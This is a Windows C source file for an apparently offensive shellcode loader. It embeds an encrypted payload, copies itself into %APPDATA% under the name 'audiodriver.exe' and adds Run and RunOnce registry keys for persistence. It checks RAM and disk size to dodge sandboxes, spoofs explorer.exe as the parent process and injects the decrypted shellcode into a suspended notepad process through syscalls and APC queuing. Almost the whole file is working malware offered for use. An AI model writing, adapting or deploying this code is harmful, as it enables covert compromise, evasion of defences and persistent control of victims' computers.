#include <Windows.h>
#include <stdio.h>
#include <shlobj.h>
#include "connector.h"
#include "syscalls.h"
#include "jitdecrypt.h"
#include "apis.h"

// Add required libraries for linking
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

// shellcode is from sektor7 rto course, but you can use cobalt strike / metasploit / whatever c2 else
unsigned char payload[] = {
    0x6b, 0xa9, 0x9d, 0x33, 0x9a, 0x61, 0x49, 0xa8, 0x6c, 0x28, 0xcd, 0x7d, 0x06, 0x6c, 0x0c, 0xec,
    0xb1, 0xee, 0x07, 0x49, 0xcd, 0x6d, 0xd5, 0x81, 0x14, 0x45, 0xdf, 0x99, 0x54, 0x06, 0x17, 0x95,
    0x6c, 0xc7, 0x0f, 0xbc, 0x1e, 0x25, 0x51, 0x60, 0x01, 0x6e, 0x63, 0xf7, 0x76, 0x13, 0x1c, 0x04,
    0x13, 0xcc, 0x36, 0xca, 0x27, 0xb0, 0x6c, 0xae, 0xf7, 0x4a, 0x3d, 0x6c, 0xdf, 0x36, 0x51, 0x5c,
    0xe0, 0xa7, 0xa7, 0x7e, 0x84, 0x64, 0xe6, 0x3c, 0x33, 0xf2, 0x07, 0x65, 0x60, 0xc1, 0x12, 0xf6,
    0xdd, 0x27, 0xbc, 0x65, 0x0b, 0x8e, 0x1c, 0x52, 0x15, 0xc4, 0xb6, 0x22, 0x85, 0xd6, 0xd5, 0x62,
    0xe6, 0x94, 0x6c, 0x06, 0x85, 0xf2, 0xb1, 0xf7, 0xae, 0x29, 0xe8, 0x93, 0x07, 0x6a, 0x47, 0xb2,
    0xa6, 0xc2, 0x1d, 0xac, 0x95, 0xf9, 0x06, 0x13, 0x1c, 0xe1, 0x84, 0x61, 0x7f, 0xd8, 0xb4, 0xc4,
    0x90, 0x43, 0xb5, 0x34, 0xed, 0x25, 0x10, 0x31, 0xdb, 0x22, 0x8f, 0xfa, 0x47, 0x4d, 0xe0, 0xe2,
    0x9e, 0x57, 0x41, 0xcf, 0x65, 0xf0, 0x34, 0x74, 0x9c, 0xdb, 0x6f, 0x7a, 0x9c, 0xe7, 0x52, 0x0f,
    0x55, 0x0f, 0x08, 0xbf, 0x05, 0x59, 0x6b, 0xb7, 0x15, 0x09, 0xcc, 0x6d, 0xee, 0x68, 0xbf, 0x1c,
    0xbd, 0x3f, 0xcf, 0xa5, 0xd7, 0x57, 0x2c, 0x95, 0x1b, 0x22, 0x73, 0xdc, 0x3a, 0xc9, 0x11, 0x4d,
    0xcd, 0xf6, 0x36, 0xcc, 0xf8, 0x01, 0xd6, 0x73, 0x2e, 0xb6, 0x54, 0xec, 0x64, 0xfa, 0x01, 0xf9,
    0x79, 0x41, 0x05, 0x52, 0x86, 0x02, 0xc9, 0x07, 0x27, 0x8d, 0x32, 0xac, 0xf5, 0x7d, 0x82, 0xe8,
    0xfb, 0x61, 0xdc, 0xc4, 0x63, 0x5b, 0x0c, 0xb5, 0x56, 0x95, 0xd7, 0xbd, 0x0d, 0x93, 0x4a, 0xdd,
    0x44, 0xa8, 0x96, 0xc3, 0x20, 0xc6, 0x51, 0x62, 0x27, 0xa4, 0x64, 0x61, 0xd5, 0x80, 0xea, 0x64,
    0x9e, 0x79, 0xba, 0x7c, 0xee, 0x79, 0x6f, 0x87, 0xe4, 0xb5, 0x24, 0x81, 0x95, 0x3a, 0x65, 0xd3,
    0xbd, 0x76, 0x40, 0xbc
};
PVOID remoteBuf;
HANDLE processHandle;
STARTUPINFO info = { 0 };
PROCESS_INFORMATION processInfo = { 0 };

BOOL InstallRunPersistence(LPCWSTR valueName, LPCWSTR exePath) {
    HKEY hKey;
    LONG openRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (openRes != ERROR_SUCCESS) {
        return FALSE;
    }
    LONG setRes = RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    return setRes == ERROR_SUCCESS;
}

BOOL InstallRunOncePersistence(LPCWSTR exePath) {
    HKEY hKey;
    LONG openRes = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_WRITE, &hKey);
    if (openRes != ERROR_SUCCESS) {
        return FALSE;
    }

    GUID guid;
    CoCreateGuid(&guid);
    OLECHAR guidStr[39];
    StringFromGUID2(guid, guidStr, 39);

    LONG setRes = RegSetValueExW(hKey, guidStr, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    return setRes == ERROR_SUCCESS;
}

int remInj() {
    DWORD parentPID = findExplorerPID();
    if (parentPID == 0) {
        printf("Failed to find explorer.exe\n");
        return 0;
    }

    HANDLE parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPID);
    if (parentProcessHandle == NULL) {
        printf("Failed to open parent process\n");
        return 0;
    }

    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    ZeroMemory(&si, sizeof(STARTUPINFOEXW));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);

    if (!CreateProcessW(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        printf("Failed to create process\n");
        CloseHandle(parentProcessHandle);
        return 0;
    }

    processHandle = pi.hProcess;

    NTSTATUS status;
    SIZE_T allocSize = sizeof(payload);

    status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status == 0) {
        printf("Allocated memory at: %p\n", remoteBuf);
    }
    else {
        printf("Failed to allocate memory\n");
        return 0;
    }

    DWORD keySeed = 0x87654321;
    printf("Decrypting payload with key seed: 0x%x\n", keySeed);
    JITDecrypt(payload, sizeof(payload), keySeed);

    status = NtWriteVirtualMemory(processHandle, remoteBuf, payload, sizeof(payload), NULL);
    if (status == 0) {
        printf("Payload written successfully\n");
    }
    else {
        printf("Failed to write payload\n");
        return 0;
    }

    if (QueueAPCInject_x64(processHandle, remoteBuf)) {
        printf("APC queued successfully\n");
    }
    else {
        printf("Failed to queue APC\n");
    }

    ResumeThread(pi.hThread);
    NtClose(processHandle);
    NtClose(pi.hThread);
    CloseHandle(parentProcessHandle);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return 0;
}

int antidbg() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAM = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
    if (RAM < 4096) {
        return -1;
    }
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD disk = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024);
    if (disk < 100) {
        return -1;
    }

    remInj();
    return 44;
}

int main(int argc, char* argv[]) {
    // Get the full path of the current executable
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(NULL, currentPath, MAX_PATH);

    // Construct the destination path in %APPDATA%\SystemTools
    wchar_t appDataPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        wchar_t destDir[MAX_PATH];
        swprintf_s(destDir, MAX_PATH, L"%s\\SystemTools", appDataPath);

        // Create the directory if it doesn't exist
        CreateDirectoryW(destDir, NULL);

        wchar_t destPath[MAX_PATH];
        swprintf_s(destPath, MAX_PATH, L"%s\\audiodriver.exe", destDir);

        // Copy the file
        if (CopyFileW(currentPath, destPath, FALSE)) {
            // Install persistence
            InstallRunPersistence(L"AudioDriver", destPath);
            InstallRunOncePersistence(destPath);
        }
    }


    if (antidbg() == 44) {
        printf("Running xD\n");
        return 0;
    }
    else if (antidbg() == -1) {
        printf("in a sandbox xD\n");
        return 0;
    }
}
